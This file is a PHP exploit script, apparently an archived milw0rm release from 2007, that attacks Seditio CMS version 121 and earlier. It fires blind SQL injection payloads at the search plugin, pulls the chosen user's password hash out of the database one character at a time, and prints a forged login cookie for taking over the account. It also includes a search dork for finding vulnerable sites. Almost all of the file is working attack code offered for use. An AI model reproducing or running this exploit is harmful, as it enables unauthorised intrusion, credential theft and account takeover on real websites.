@@ -1,0 +1,108 @@
+<?php
+## Seditio CMS <= 121 Remote SQL Injection Exploit
+## Software site: http://www.neocrome.net/
+## By InATeam (http://inattack.ru/)
+## Requirements: MySQL >= 4.1, magic_quotes_gpc=Off
+
+echo "------------------------------------------------------------\n";
+echo "Seditio CMS <= 121 Remote SQL Injection Exploit\n";
+echo "(c)oded by Raz0r, InATeam (http://inattack.ru/)\n";
+echo "dork: \"Powered by Seditio\"\n";
+echo "------------------------------------------------------------\n";
+
+if ($argc<2) {
+echo "USAGE:\n";
+echo "~~~~~~\n";
+echo "php {$argv[0]} [url] OPTIONS\n\n";
+echo "[url]        - target server where Seditio CMS is installed\n\n";
+echo "OPTIONS:\n";
+echo "-p=<prefix>  - use specific prefix (default sed_)\n";
+echo "-id=<id>     - use specific user id (default 1)\n\n";
+echo "examples:\n";
+echo "php {$argv[0]} http://site.com/ -p=cms_\n";
+echo "php {$argv[0]} http://cms.site.com:8080/ -id=2\n";
+die;
+}
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",10);
+$url = $argv[1];
+for($i=2;$i<$argc;$i++) {
+   if(strpos($argv[$i],"=")!==false) {
+       $exploded=explode("=",$argv[$i]);
+       if ($exploded[0]=='-p') $prefix = $exploded[1];
+       if ($exploded[0]=='-id') $id = $exploded[1];
+   }
+}
+if (!isset($prefix)) $prefix = "sed_";
+if (!isset($id)) $id = 1;
+$url_parts = parse_url($url);
+$host = $url_parts['host'];
+if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
+$path = $url_parts['path'];
+print("[~] Connecting... ");
+if (!getchar("<1",$i,false)) print("OK\n");
+else die("\n[-] Exploit failed\n");
+print("    Getting hash...");
+$hash='';
+for ($i=1; $i<=32; $i++) {
+   if (!getchar(">57",$i)) {
+       $min = 48;
+       $max = 57;           }
+   else {
+       $min = 97;
+       $max = 102;           }
+   for($j=$min;$j<=$max;$j++) {
+       if (getchar("+LIKE+$j",$i)) {
+           $hash .= chr($j);
+           break;
+       }
+   }
+}
+print("[+] Done! hash - $hash\n");
+print("[+] Cookie to log in: \nSEDITIO=".base64_encode($id.":_:".$hash.":_:ice")."\n");
+
+function getchar($query,$pos,$status=true){
+   global $host,$path,$prefix,$id;
+   if ($status) status();
+   $data = "sq=InATeam&frm_sub%5B%5D=9999&sea_frmtitle=1&sea_frmtext=1&sea_pagtitle=1";
+   $data.= "&sea_pagdesc=1&sea_pagtext=1&searchin_pag=1&pag_sub%5B%5D=qwerty')";
+   $data.= "+AND+1=IF(ORD(MID((SELECT+user_password+FROM+{$prefix}users+WHERE";
+   $data.= "+user_id={$id}),{$pos},1)){$query},1,(SELECT+1+UNION+SELECT+5))/*&x=GUEST";
+      $packet  = "POST {$path}plug.php?e=search&a=search HTTP/1.1\r\n";
+   $packet .= "Host: {$host}\r\n";
+   $packet .= "Referer: http://{$host}{$path}plug.php?e=search&a=search\r\n";
+   $packet .= "User-Agent: InAttack User Agent\r\n";
+   $packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+   $packet .= "Content-Length: ".strlen($data)."\r\n";
+   $packet .= "Connection: Close\r\n\r\n";
+   $packet .= $data;
+   return (strpos(send($packet),'Subquery returns more than 1 row')===false) ? true : false;
+}
+
+function send($packet) {
+   global $host,$port;
+   $ock = fsockopen(gethostbyname($host),$port);
+   if ($ock) {
+       fputs($ock, $packet);
+       $html='';
+       while (!feof($ock)) $html.=fgets($ock);
+   }
+   else die("[-] Exploit failed\n");
+   return $html;
+}
+
+function status() {
+   static $n;
+   $n++;
+   if ($n > 3) $n = 0;
+   if($n==0){ print "\r[-]\r"; }
+   if($n==1){ print "\r[\\]\r";}
+   if($n==2){ print "\r[|]\r"; }
+   if($n==3){ print "\r[/]\r"; }
+}
+?>
+
+# milw0rm.com [2007-11-29]
